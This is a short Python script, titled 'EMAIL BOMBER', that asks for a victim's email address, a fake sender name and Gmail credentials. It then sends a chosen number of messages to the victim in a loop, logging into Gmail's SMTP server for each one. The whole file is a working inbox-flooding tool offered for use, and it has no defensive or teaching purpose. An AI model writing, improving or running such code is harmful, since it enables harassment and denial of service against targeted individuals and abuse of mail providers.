from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pathlib import Path
import smtplib
print('''###############################################
#==========>WELCOME TO EMAIL BOMBER<==========#
###############################################''')
input1=input("Enter the victim email address:")
sender_name=input("Anonymous user name:")
subject=input("Enter the subject:")
print("<========LOGIN CREDENTIALS========>")
email_id=input("Enter the email ID from which the email has to be sent:")
password=input("Enter password here:")
total=int(input("Enter the total number of times message has to be sent:"))
for i in range(1,total+1):
    message= MIMEMultipart()
    message["from"] = sender_name
    message["to"] = input1
    message["subject"] = subject

    with smtplib.SMTP(host="smtp.gmail.com",port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(email_id,password)
        smtp.send_message(message)
        print("Email Bomber Successfully activated on",input1,"for",i,"times")